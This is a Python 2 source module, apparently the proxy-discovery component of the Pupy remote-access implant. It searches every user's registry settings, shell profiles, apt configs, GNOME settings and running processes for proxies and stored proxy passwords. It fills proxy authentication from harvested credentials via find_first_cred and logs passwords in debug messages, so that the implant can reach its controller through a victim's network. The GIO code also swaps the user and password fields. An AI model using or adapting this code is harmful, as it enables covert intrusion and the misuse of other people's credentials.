# -*- coding: utf-8 -*-

__all__ = (
    'get_proxies', 'find_default_proxy',
    'get_proxy_for_address', 'set_proxy_unavailable',
    'has_wpad', 'parse_proxy', 'find_proxies',
    'find_proxies_for_transport', 'ProxyInfo',
    'connect_client_with_proxy_info',
    'CHECK_CONNECTIVITY_URL'
)


import re
import os
import time

from collections import namedtuple

from . import getLogger
from . import Proxy

from .clients import PupyTCPClient, PupySSLClient
from .clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient

from .netcreds import find_first_cred

logger = getLogger('proxies')

PROXY_RE = r'(?:(?P<schema>[a-z45]+)://)?(?:(?P<user>\w+):?(?P<password>\w*)@)?(?P<proxy_addr>\S+:[0-9]+)/*'

PROXY_MATCHER = re.compile(
    r'^{}$'.format(PROXY_RE)
)

PROXY_ENV = [
    'http_proxy', 'https_proxy', 'rsync_proxy', 'all_proxy',
    'rvm_proxy'
]

PROXY_ENV += [
    x.upper() for x in PROXY_ENV
]

PROFILE_MATCHER = re.compile(
    r'(?:{})(?:(?:\s*=\s*)|\s+)[\'\"]?{}?[\'\"]?.*'.format(
        '|'.join(
            PROXY_ENV + [
                'Acquire::http::Proxy'
            ]
        ),
        PROXY_RE
    )
)

LAST_PROXY = None
LAST_PROXY_TIME = None

LAST_WPAD = None
LAST_WPAD_TIME = None

CHECK_CONNECTIVITY_URL = 'http://connectivitycheck.gstatic.com/generate_204'

gio = None

ProxyInfo = namedtuple(
    'ProxyArgs', [
        'client', 'client_args', 'transport_args',
        'host', 'port', 'chain'
    ])


try:
    from urllib import request as urllib
except ImportError:
    import urllib2 as urllib


def parse_win_proxy(val):
    proxies=[]

    for p in val.split(';'):
        if '=' in p:
            tab=p.split('=',1)
            if tab[0]=='socks':
                tab[0]='SOCKS4'
            proxies.append(
                Proxy(tab[0].upper(), tab[1], None, None))
        else:
            proxies.append(
                Proxy('HTTP', p, None, None))

    return proxies


def get_win_proxies():
    try:
        from _winreg import EnumKey, OpenKey, CloseKey, QueryValueEx
        from _winreg import HKEY_USERS, KEY_QUERY_VALUE
    except:
        return

    duplicates = set()

    i = 0
    while True:
        try:
            user = EnumKey(HKEY_USERS, i)
            i += 1
        except:
            break

        if user.endswith('_classes'):
            continue

        aKey = None
        try:
            key = '{}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'.format(user)
            aKey = OpenKey(HKEY_USERS, key, 0, KEY_QUERY_VALUE)
            value = QueryValueEx(aKey, 'ProxyServer')[0]
            if value:
                for p in parse_win_proxy(value):
                    if p not in duplicates:
                        logger.debug('Proxy found via Internet Settings: %s', p)
                        yield p
                        duplicates.add(p)
        except Exception:
            pass

        finally:
            if aKey:
                CloseKey(aKey)


def get_python_proxies():
    python_proxies = urllib.getproxies()

    for key, value in python_proxies.iteritems():
        if not (key.upper() in ('HTTP', 'HTTPS', 'SOCKS') and value):
            continue

        _, user, passwd, proxy = PROXY_MATCHER.match(value).groups()

        if key.upper() == 'SOCKS':
            key = 'SOCKS4'
        elif key.upper() == 'HTTPS':
            key = 'HTTP'

        logger.debug(
            '%s proxy found via standard python API: %s user=%s passwd=%s',
            key, proxy, user, passwd)

        yield Proxy(key.upper(), proxy, user, passwd)


def _normalize_env_proxies(schema, user, passwd, proxy):
    if not schema:
        yield Proxy('HTTP', proxy, user, passwd)
        yield Proxy('SOCKS5', proxy, user, passwd)
        yield Proxy('SOCKS4', proxy, user, passwd)
    elif schema.lower().startswith('http'):
        yield Proxy('HTTP', proxy, user, passwd)
    elif schema.lower() == 'socks4':
        yield Proxy('SOCKS4', proxy, user, passwd)
    elif schema.lower() == 'socks5':
        yield Proxy('SOCKS5', proxy, user, passwd)
    elif schema.lower().startswith('socks'):
        yield Proxy('SOCKS5', proxy, user, passwd)
        yield Proxy('SOCKS4', proxy, user, passwd)


def parse_env_proxies(var):
    match = PROXY_MATCHER.match(var)
    if not match:
        return

    schema, user, passwd, proxy = match.groups()
    for proxy in _normalize_env_proxies(schema, user, passwd, proxy):
        yield proxy


def get_env_proxies():
    for env in PROXY_ENV:
        var = os.environ.get(env)

        if not var:
            continue

        for proxy in parse_env_proxies(var):
            yield proxy


def _try_read(path):
    try:
        return open(path).read()
    except (OSError, IOError):
        return None


def _get_profile_files_content():
    try:
        profile_d = os.listdir('/etc/profile.d')
    except OSError:
        profile_d = []

    for profile_file in profile_d:
        content = _try_read(
            os.path.join('/etc/profile.d', profile_file))
        if content:
            yield content

    content = _try_read('/etc/profile')
    if content:
        yield content

    try:
        apt_d = os.listdir('/etc/apt/apt.conf.d')
    except OSError:
        apt_d = []

    for apt_file in apt_d:
        content = _try_read(os.path.join(
            '/etc/apt/apt.conf.d', apt_file))
        if content:
            yield content

    try:
        import pwd
    except ImportError:
        return

    for user in pwd.getpwall():
        for profile in ('.bashrc', '.profile'):
            content = _try_read(os.path.join(user.pw_dir, profile))
            if content:
                yield content


def get_profile_proxies():
    for content in _get_profile_files_content():
        for match in PROFILE_MATCHER.findall(content):
            for proxy in _normalize_env_proxies(*match):
                yield proxy


def gio_init():
    global gio

    if gio is not None:
        return gio

    try:
        import ctypes

        gio = ctypes.CDLL('libgio-2.0.so')

        if hasattr(gio, 'g_type_init'):
            gio.g_type_init()

        gio.g_settings_new.restype = ctypes.c_void_p
        gio.g_settings_new.argtypes = [ctypes.c_char_p]

        gio.g_object_unref.argtypes = [ctypes.c_void_p]

        gio.g_settings_get_string.restype = ctypes.c_char_p
        gio.g_settings_get_string.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

        gio.g_settings_get_int.restype = ctypes.c_int
        gio.g_settings_get_int.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

        gio.g_settings_get_boolean.restype = ctypes.c_bool
        gio.g_settings_get_boolean.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

        gio.g_settings_get_child.restype = ctypes.c_void_p
        gio.g_settings_get_child.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

        if hasattr(gio, 'g_settings_schema_source_get_default'):
            gio.g_settings_schema_source_get_default.restype = ctypes.c_void_p
            gio.g_settings_schema_source_lookup.restype = ctypes.c_void_p
            gio.g_settings_schema_source_lookup.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_bool
            ]
        else:
            gio.g_settings_schema_source_get_default = None


    except Exception, e:
        logger.error('GIO initialization failed: %s', e)
        gio = False

    return gio


def get_gio_proxies(force=True):
    gio = gio_init()
    if not gio:
        return

    schema = 'org.gnome.system.proxy'

    if gio.g_settings_schema_source_get_default:
        logger.debug('GIO: Check %s exists', schema)

        sources = gio.g_settings_schema_source_get_default()
        proxy_schema = gio.g_settings_schema_source_lookup(sources, schema, True)
        schema_found = bool(proxy_schema)

        if not schema_found:
            return
    else:
        logger.debug('TODO: Checking schemes for older GIO ABI is not supported yet')
        # TODO: g_settings_list_schemas
        return

    try:
        proxy = gio.g_settings_new(schema)

        mode = gio.g_settings_get_string(proxy, 'mode')
        if not force and (not mode or mode == 'none'):
            return

        http = gio.g_settings_get_child(proxy, 'http')
        host = gio.g_settings_get_string(http, 'host')
        port = gio.g_settings_get_int(http, 'port')
        user, password = None, None
        if gio.g_settings_get_boolean(http, 'use-authentication'):
            user = gio.g_settings_get_string(http, 'authentication-password')
            password = gio.g_settings_get_string(http, 'authentication-user')
        gio.g_object_unref(http)

        if host and port:
            logger.debug('HTTP Proxy found via GIO: %s:%s user=%s password=%s', host, port, user, password)
            yield Proxy('HTTP', '{}:{}'.format(host, port), user, password)

        socks = gio.g_settings_get_child(proxy, 'socks')
        host = gio.g_settings_get_string(socks, 'host')
        port = gio.g_settings_get_int(socks, 'port')
        gio.g_object_unref(socks)

        if host and port:
            logger.debug('SOCKS Proxy found via GIO: %s:%s user=%s password=%s', host, port, user, password)
            yield Proxy('SOCKS', '{}:{}'.format(host, port), None, None)

    except Exception, e:
        logger.exception('GIO request exception: %s', e)

    finally:
        gio.g_object_unref(proxy)


def get_processes_proxies():
    try:
        import psutil
    except:
        return

    proxies = set()

    for p in psutil.process_iter():
        try:
            environ = p.as_dict(['environ'])['environ']
        except (WindowsError, NotImplementedError):
            continue

        if not environ:
            continue

        for var in PROXY_ENV:
            if var not in environ or not environ[var]:
                continue

            proxies.add(environ[var])

    for proxy in proxies:
        for parsed in parse_env_proxies(proxy):
            logger.debug('Proxy found via env: %s -> %s', proxy, parsed)
            yield parsed


def parse_proxy(proxy_str):
    login, password = None, None

    if isinstance(proxy_str, Proxy):
        yield proxy_str
    elif hasattr(proxy_str, 'as_tuple'):
        yield Proxy(*proxy_str.as_tuple())
    # HTTP:login:password@ip:port
    elif '://' in proxy_str:
        for proxy in parse_env_proxies(proxy_str):
            yield proxy
    else:
        #HTTP:ip:port OR HTTP:ip:[port:]login:password
        parts = proxy_str.split(':')

        if len(parts) >= 4:
            login, password = parts[-2], parts[-1]
            parts = parts[:-2]

        if len(parts) not in (2,3):
            return

        elif len(parts) == 2:
            proxy_type = 'SOCKS5'
            address, port = parts
        else:
            proxy_type, address, port = parts

        yield Proxy(
            proxy_type.upper(), address+':'+port, login, password
        )


def get_proxies():
    if LAST_PROXY is not None:
        yield LAST_PROXY

    for proxy in get_python_proxies():
        yield proxy

    for proxy in get_env_proxies():
        yield proxy

    if os.name == 'nt':
        for proxy in get_win_proxies():
            yield proxy

    elif os.name == 'posix':
        for proxy in get_profile_proxies():
            yield proxy

        for proxy in get_gio_proxies():
            yield proxy

    for proxy in get_processes_proxies():
        yield proxy


def _check_proxy_info(proxy_info):
    from .tinyhttp import HTTP

    logger.debug('%s - check', proxy_info)
    ctx = HTTP(proxy=proxy_info, timeout=5)
    try:
        data, code = ctx.get(CHECK_CONNECTIVITY_URL, code=True)

    except Exception, e:
        logger.debug('%s - failed - %s', proxy_info, e)
        return False

    if code == 204 and data == '':
        logger.debug('%s - ok', proxy_info)
        return True

    return False


def find_default_proxy():
    global LAST_PROXY, LAST_PROXY_TIME

    if LAST_PROXY_TIME is not None:
        if time.time() - LAST_PROXY_TIME < 3600:
            logger.debug('Cached default proxy: %s', LAST_PROXY)
            return LAST_PROXY

    logger.debug('Refresh required')

    LAST_PROXY_TIME = time.time()

    dups = set()

    for proxy_info in get_proxies():
        if proxy_info in dups:
            continue

        dups.add(proxy_info)

        if _check_proxy_info(proxy_info):
            LAST_PROXY = proxy_info
            return LAST_PROXY

    return LAST_PROXY


def has_wpad():
    global LAST_WPAD, LAST_WPAD_TIME

    if not get_proxy_for_address:
        return None

    if LAST_WPAD is not None:
        if time.time() - LAST_WPAD_TIME < 3600:
            logger.debug('Cached wpad: %s', LAST_WPAD)
            return LAST_WPAD

    from .tinyhttp import HTTP

    LAST_WPAD_TIME = time.time()

    pac_player = refresh_pac_player()
    if not pac_player:
        LAST_WPAD = False
        return False

    LAST_WPAD = False

    for proxy_info in get_proxy_for_address(CHECK_CONNECTIVITY_URL):
        ctx = HTTP(proxy=proxy_info, timeout=5)
        try:
            data, code = ctx.get(CHECK_CONNECTIVITY_URL, code=True)
        except Exception, e:
            logger.debug('WPAD: %s - failed - %s', proxy_info, e)
            continue

        if code == 204 and data == '':
            logger.debug('WPAD: %s - ok', proxy_info)
            LAST_WPAD = True
            break

    return LAST_WPAD


try:
    from .pac import (
        get_proxy_for_address, set_proxy_unavailable,
        refresh_pac_player
    )
except ImportError:
    get_proxy_for_address = None
    refresh_pac_player = None
    set_proxy_unavailable = None


def find_auth(proxy_info):
    if proxy_info.username or proxy_info.password:
        return

    if proxy_info.addr is None:
        # DIRECT for example
        return

    port = None
    cred = None

    try:
        if ':' in proxy_info.addr:
            address, port = proxy_info.addr.rsplit(':', 1)

        cred = find_first_cred(
            proxy_info.type.lower(),
            address, port
        )
    except Exception as e:
        logger.exception(e)
        return

    if cred:
        proxy_info.username = cred.user
        proxy_info.password = cred.password


def is_proxiable(chain, transport_info):
    if _is_native_for(chain, transport_info.transport):
        return True

    if not issubclass(transport_info.transport.client, PupyTCPClient):
        return False

    return True


def find_proxies(url=None, auth=True):
    wpad_proxies = None

    if url and get_proxy_for_address:
        wpad_proxies = get_proxy_for_address(url)
        logger.info('URL: %s WPAD: %s', url, wpad_proxies)

    if wpad_proxies:
        logger.info('WPAD for %s: %s', url, wpad_proxies)
        for proxy_info in wpad_proxies:
            if auth:
                find_auth(proxy_info)

            yield proxy_info

    # Try proxies which works
    proxy_info = find_default_proxy()
    if proxy_info:
        if auth:
            find_auth(proxy_info)

        yield proxy_info

    # Try everything
    for proxy_info in get_proxies():
        if proxy_info:
            if auth:
                find_auth(proxy_info)

            yield proxy_info


def make_args_for_transport_info(transport_info, host_info, chain):

    chost, cport, chostname = host_info
    transport_args = transport_info.transport_args.copy()
    client_args = transport_info.client_args.copy()
    client = transport_info.transport.client

    if chostname is not None and chostname != chost:
        if ':' in chostname:
            chostname = '[' + chostname + ']'

        transport_args['host'] = chostname

    if not chain:
        return ProxyInfo(
            client, client_args, transport_args,
            chost, cport, chain
        )

    first = chain[0]

    if _is_native_for(chain, transport_info.transport):
        chost, cport = first.addr.split(':')
        cport = int(cport)
        chain = []
    else:
        client_args['proxies'] = chain

        if client is PupyTCPClient:
            client = PupyProxifiedTCPClient
        elif client is PupySSLClient:
            client = PupyProxifiedSSLClient
        else:
            raise ValueError(
                'Proxification for {} is not implemented'.format(
                    client))

    transport_args['proxy'] = True
    if first.password or first.username:
        transport_args['auth'] = (first.username, first.password)

    transport_args['connect'] = host_info.host, host_info.port

    return ProxyInfo(
        client, client_args, transport_args, chost, cport, chain
    )


def _parse_proxies(proxies):
    if not proxies:
        return

    for proxy in proxies:
        for parsed_proxy in parse_proxy(proxy):
            yield parsed_proxy


def find_proxies_for_transport(
        transport_info, host_info,
        lan_proxies=None, wan_proxies=None, auto=True, wpad=True, direct=True):

    host, port, _ = host_info
    wpad_uri = None
    parsed_wan_proxies = list(_parse_proxies(wan_proxies))
    dups = set()

    if auto:
        if wpad:
            uri_host = host
            if ':' in host:
                uri_host = '[' + host + ']'
            wpad_uri = 'tcp://{}:{}'.format(uri_host, port)
            if 'HTTP' in transport_info.transport.internal_proxy_impl:
                wpad_uri = 'http://{}{}'.format(
                    uri_host, ':{}'.format(port) if port != 80 else '')

        for lan_proxy in find_proxies(wpad_uri):
            chain = []
            if lan_proxy in dups:
                continue

            dups.add(lan_proxy)

            if lan_proxy.type != 'DIRECT':
                chain.append(lan_proxy)

            chain.extend(parsed_wan_proxies)

            if not is_proxiable(chain, transport_info):
                logger.debug('Rejected proposition %s - unsupported transport', chain)
                continue

            yield make_args_for_transport_info(
                transport_info, host_info, chain)

    for lan_proxy in _parse_proxies(lan_proxies):
        if lan_proxy in dups:
            continue

        if _check_proxy_info(lan_proxy):
            global LAST_PROXY, LAST_PROXY_TIME

            LAST_PROXY = lan_proxy
            LAST_PROXY_TIME = time.time()

        dups.add(lan_proxy)

        chain = [lan_proxy]
        chain.extend(parsed_wan_proxies)

        if not is_proxiable(chain, transport_info):
            logger.debug('Rejected proposition %s - unsupported transport', chain)
            continue

        yield make_args_for_transport_info(
            transport_info, host_info, chain)

    if direct:
        if parsed_wan_proxies:
            yield make_args_for_transport_info(
                transport_info, host_info, parsed_wan_proxies)
        else:
            # Just return same info
            yield make_args_for_transport_info(
                transport_info, host_info, [])


def _is_native_for(proxies, transport):
    if not proxies or not len(proxies) == 1:
        return False

    first_proxy = proxies[0]

    return first_proxy.type in transport.internal_proxy_impl


def connect_client_with_proxy_info(transport_info, proxy_info):
    client = proxy_info.client(**proxy_info.client_args)
    sock = client.connect(proxy_info.host, proxy_info.port)
    stream = transport_info.transport.stream(
        sock,
        transport_info.transport.client_transport,
        proxy_info.transport_args
    )

    return stream
